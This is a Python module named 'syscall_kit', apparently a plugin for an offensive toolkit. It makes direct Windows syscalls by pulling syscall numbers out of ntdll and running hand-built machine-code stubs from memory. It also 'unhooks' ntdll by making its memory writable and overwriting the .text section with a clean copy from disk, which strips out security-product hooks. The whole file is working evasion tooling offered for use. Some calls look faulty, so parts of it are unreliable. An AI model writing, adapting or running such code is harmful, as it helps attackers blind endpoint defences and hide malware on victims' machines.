"""
syscall_kit — Syscall-Wrapper / API-Unlinker.
Appels systeme directs: extraction runtime des numeros syscall depuis ntdll,
stubs machine-code, dehook de ntdll (rechargement depuis le disque).
Windows uniquement. Echec gracieux ailleurs.
Actions: extract, call, unhook, status
"""
NAME = "syscall_kit"
VERSION = "1.0.0"
DESCRIPTION = "Syscalls directs: numeros extraits de ntdll, stubs machine-code, dehook (Syscall-Wrapper)."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows"]

import os
import struct

try:
    import ctypes
except Exception:
    ctypes = None

K32 = None
NTDLL = None
_CACHE = {}


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def _init():
    global K32, NTDLL
    if os.name != "nt":
        return False
    K32 = ctypes.windll.kernel32
    NTDLL = ctypes.windll.ntdll
    return True


def run(action, params):
    if not _init():
        return _result(error="syscall_kit requires Windows", status="failed")
    try:
        if action == "extract":
            return _extract(params)
        if action == "call":
            return _call(params)
        if action == "unhook":
            return _unhook(params)
        if action == "status":
            return _status(params)
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="syscall_kit: " + str(exc), status="failed")


def _read_mem(addr, size):
    return ctypes.string_at(addr, size)


def _ntdll_base():
    hmod = ctypes.c_void_p()
    if K32.GetModuleHandleExW(0x00000002, "ntdll", ctypes.byref(hmod)):
        base = hmod.value
    else:
        K32.GetModuleHandleW.restype = ctypes.c_void_p
        base = K32.GetModuleHandleW("ntdll")
    if not base:
        raise ValueError("ntdll not loaded")
    dos = ctypes.string_at(base, 0x40)
    e_lfanew = struct.unpack_from("<I", dos, 0x3C)[0]
    opt_off = base + e_lfanew + 24
    magic = struct.unpack_from("<H", ctypes.string_at(opt_off, 2))[0]
    size_image = struct.unpack_from(
        "<I", ctypes.string_at(opt_off + 56, 4))[0]
    return base, size_image


def _extract(params):
    """Extrait le numero syscall d'une fonction ntdll donnee."""
    names = params.get("names") or params.get("name") or "NtQuerySystemInformation"
    if isinstance(names, str):
        names = [names]
    ntdll_base, _ = _ntdll_base()
    out = []
    for fn in names:
        try:
            addr = K32.GetProcAddress(ctypes.c_void_p(
                K32.GetModuleHandleW("ntdll")), fn)
        except Exception:
            addr = None
        if not addr:
            out.append({"name": fn, "error": "not exported"})
            continue
        blob = _read_mem(addr, 32)
        num = None
        for i in range(len(blob) - 4):
            # mov r10, rcx ; mov eax, imm  => 4C 8B D1 B8 xx xx xx xx
            if blob[i:i + 4] == b"\x4c\x8b\xd1\xb8":
                num = struct.unpack_from("<I", blob, i + 4)[0]
                break
            # mov eax, imm => B8 xx xx xx xx
            if blob[i] == 0xB8:
                num = struct.unpack_from("<I", blob, i + 1)[0]
                break
        out.append({"name": fn, "address": hex(addr), "syscall": num})
    return _result(data={"extracted": out})


def _stub_bytes(syscall_num):
    """Stub: mov r10, rcx ; mov eax, SSN ; syscall ; ret"""
    return (b"\x4c\x8b\xd1\xb8" + struct.pack("<I", syscall_num) +
            b"\x0f\x05\xc3")


def _call(params):
    name = params.get("name", "NtQuerySystemInformation")
    args = params.get("args", [])
    ex = _extract({"names": [name]}).get("data", {}).get("extracted", [])
    if not ex or ex[0].get("syscall") is None:
        return _result(error="Syscall not found for " + name, status="failed")
    num = ex[0]["syscall"]
    if num in _CACHE:
        stub = _CACHE[num]
    else:
        stub = _stub_bytes(num)
        _CACHE[num] = stub
    MEM_COMMIT, MEM_RESERVE = 0x1000, 0x2000
    PAGE_READWRITE, PAGE_EXECUTE_READ = 0x04, 0x20
    buf = K32.VirtualAlloc(None, len(stub), MEM_COMMIT | MEM_RESERVE,
                           PAGE_READWRITE)
    if not buf:
        raise ValueError("VirtualAlloc failed")
    ctypes.memmove(buf, stub, len(stub))
    old = ctypes.c_uint32(0)
    K32.VirtualProtect(buf, len(stub), PAGE_EXECUTE_READ, ctypes.byref(old))
    argv = [ctypes.c_uint64(a) for a in args]
    proto = ctypes.CFUNCTYPE(ctypes.c_uint64, *([ctypes.c_uint64] * len(argv)))
    fn = proto(buf)
    ret = fn(*argv)
    return _result(data={"name": name, "syscall": num,
                         "return": ret, "stub": buf})


def _unhook(params):
    """Dehook ntdll: recharge une copie propre depuis le disque et restaure
    les sections .text dupliquees."""
    import shutil
    bs = chr(92)
    sysroot = os.environ.get("SystemRoot", "C:" + bs + "Windows")
    disk_path = sysroot + bs + "System32" + bs + "ntdll.dll"
    if not os.path.isfile(disk_path):
        return _result(error="Disk ntdll not found", status="failed")
    tmp = os.environ.get("TEMP", ".")
    dst = os.path.join(tmp, "lucy_ntdll_clean.dll")
    shutil.copy2(disk_path, dst)
    try:
        size = os.path.getsize(dst)
        with open(dst, "rb") as fh:
            disk = fh.read()
    finally:
        try:
            os.remove(dst)
        except Exception:
            pass
    ntdll_base, size_image = _ntdll_base()
    dos = disk[:0x40]
    e_lfanew = struct.unpack_from("<I", dos, 0x3C)[0]
    coff = e_lfanew + 4
    nsec = struct.unpack_from("<H", disk, coff + 2)[0]
    opt_off = coff + 20
    sec_off = opt_off + struct.unpack_from("<H", disk, coff + 16)[0]
    PAGE_EXECUTE_READWRITE = 0x40
    K32.VirtualProtect(ctypes.c_void_p(ntdll_base), size_image,
                       PAGE_EXECUTE_READWRITE, ctypes.byref(ctypes.c_uint32(0)))
    restored = []
    for i in range(nsec):
        off = sec_off + i * 40
        name = disk[off:off + 8].rstrip(b"\0").decode("latin1", "replace")
        vsize, vaddr, raw_size, raw_ptr = struct.unpack_from("<IIII",
                                                             disk, off + 8)
        if name.lower() != ".text":
            continue
        chunk = disk[raw_ptr:raw_ptr + raw_size]
        ctypes.memmove(ntdll_base + vaddr, chunk, len(chunk))
        restored.append({"section": name, "size": len(chunk)})
    return _result(data={"restored_sections": restored})


def _status(params):
    try:
        base, size = _ntdll_base()
        return _result(data={"ntdll_base": hex(base), "size_image": size,
                             "syscall_cache": len(_CACHE)})
    except Exception as exc:
        return _result(error=str(exc), status="failed")
